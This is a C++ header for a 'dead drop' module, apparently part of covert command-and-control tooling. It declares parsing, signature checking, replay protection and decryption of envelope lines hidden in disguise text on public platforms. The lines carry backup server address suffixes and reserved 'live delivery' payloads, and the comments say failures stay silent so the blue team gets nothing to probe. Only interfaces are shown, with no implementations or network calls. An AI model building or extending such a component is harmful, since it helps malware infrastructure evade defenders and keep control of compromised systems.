/**
 * @file DeadDropCrypto.hpp
 * @brief  死投递内容层: 解析/验签/序列号/解密(纯逻辑, 无 IO —— 可单测)
 * @details
 * 平台内容行格式(DD1 信封族, 嵌在伪装文本中, 上下游以"整行"为边界):
 * @code
 *   DD1:<seq>:<nonce_b64url>:<ct_b64url>:<mac_b64url>       (= a 型, 地址后缀; 兼容历史)
 *   DD1a:<seq>:<nonce_b64url>:<ct_b64url>:<mac_b64url>      (= a 型显式写法)
 *   DD1b:<seq>:<nonce_b64url>:<ct_b64url>:<mac_b64url>      (= b 型, 通用载荷 —— 活投递预留)
 * @endcode
 *   - tag     = 类型(空/a = 地址后缀 suffix; b = 通用载荷 payload)。同一段平台文本
 *               可同时含 a/b 各一行, 各类型只认自己的 tag;
 *   - seq     = 发布序号(Unix 分钟数, 天然单调; 人工可读)—— **a/b 共用同一单调空间**
 *               (Manager 单一 last_accepted),"比已接受的新"与类型无关;
 *   - nonce   = 24B XChaCha20-Poly1305 nonce
 *   - ct      = XChaCha20-Poly1305(subKey, 明文)  —— a 型明文 = 备胎地址后缀,
 *               b 型明文 = 任意载荷字节串
 *   - mac     = HMAC-SHA256(macKey, 整行去 mac 段的前缀) —— **覆盖类型 tag**,
 *               a/b(乃至任何改 tag 的篡改)互不可替换;
 *   - 密钥分离: subKey = SHA256(key||0x01), macKey = SHA256(key||0x02)
 *     (认证密钥与加密密钥不得同源复用)
 *
 * 校验顺序即安全顺序: 格式 → HMAC(恒定时间) → seq 单调 → AEAD open。
 * 任何一步失败统一返回 false —— **失败原因不外泄**(不给蓝队探测面)。
 *
 * 依赖: libsodium(已链入; sodium_init 幂等, 构造时防御性调用)。
 * 线程安全: 无状态(const 校验), Build/BuildPayload 静态; 密钥成员只读。
 */
#pragma once

#include <cstdint>
#include <string>
#include <vector>

namespace cleat {
namespace deaddrop {

    struct ExtractResult {
        std::string suffix;       ///< 解密后的备胎地址后缀(prefix 在代码内硬编码)
        uint64_t    seq = 0;      ///< 本帧发布序号(通过校验后调用方持久化为 last_accepted)
    };

    /// b 型(通用载荷)的解出结果 —— 活投递下行预留; 消费方(低频调度)未接线前无调用方
    struct PayloadResult {
        std::string payload;      ///< 解密后的载荷字节串
        uint64_t    seq = 0;
    };

    class DeadDropCrypto {
    public:
        explicit DeadDropCrypto(const std::string& masterKey);
        //  密钥材料用后即擦 —— 子钥驻留 vector<uint8_t>,
        // 析构 sodium_memzero; 拷贝会让"擦除后仍有一份明文副本"的推理失效, 禁用。
        DeadDropCrypto(const DeadDropCrypto&) = delete;
        DeadDropCrypto& operator=(const DeadDropCrypto&) = delete;
        ~DeadDropCrypto();

        /**
         * @brief 从平台原始文本中提取+验证+解密 **a 型(地址后缀)**
         * @param platformText    平台原始内容(伪装文本中混 DD1 行)
         * @param lastAcceptedSeq 本机已接受的最大序号(0 = 首次, 接受任何已签名内容)
         * @param out             成功时输出 suffix 与 seq
         * @return false = 无 a 型行/格式/签名/重放/解密任一失败(原因不外泄)
         */
        bool VerifyAndExtract(const std::string& platformText,
            uint64_t lastAcceptedSeq, ExtractResult& out) const;

        /**
         * @brief 从平台原始文本中提取+验证+解密 **b 型(通用载荷)**(活投递预留)
         * @return false = 无 b 型行/格式/签名/重放/解密任一失败(原因不外泄)
         */
        bool VerifyPayload(const std::string& platformText,
            uint64_t lastAcceptedSeq, PayloadResult& out) const;

        /// 发布侧(a 型, 工具/mock 用): 生成含 **DD1:**(历史形态)行的完整平台文本
        static std::string Build(const std::string& masterKey,
            const std::string& disguiseText, const std::string& suffix, uint64_t seq);

        /// 发布侧(b 型): 生成含 **DD1b:** 行的完整平台文本(活投递载荷)
        static std::string BuildPayload(const std::string& masterKey,
            const std::string& disguiseText, const std::string& payload, uint64_t seq);

    private:
        /// Build/BuildPayload 公共体: 生成 "<head><seq>:<nonce>:<ct>:" + mac 的信封行,
        /// 前拼伪装文本。head 含完整类型段(如 "DD1:" / "DD1b:")。
        static std::string BuildEnvelope(const std::string& masterKey,
            const std::string& head, const std::string& plaintext,
            const std::string& disguiseText, uint64_t seq);

        /**
         * @brief 单行信封的完整校验管线(格式 → HMAC 恒定时间 → seq 单调 → AEAD open)
         * @param wantB       false = a 型(地址后缀), true = b 型(通用载荷);
         *                    macPrefix 覆盖类型段, 类型即域分隔
         * @return false = 该行格式/签名/重放/解密任一失败(原因不外泄)
         */
        bool OpenEnvelope(const std::string& line, bool wantB,
            uint64_t lastAcceptedSeq, std::string& plainOut, uint64_t& seqOut) const;

        ///  两把子钥 sodium_memzero(析构与将来任何重置路径共用)
        void WipeKeys();

        std::vector<uint8_t> subKey_;   ///< SHA256(masterKey || 0x01) —— 加密子钥(32B 原始)
        std::vector<uint8_t> macKey_;   ///< SHA256(masterKey || 0x02) —— 验签子钥(32B 原始)
    };

} // namespace deaddrop
} // namespace cleat
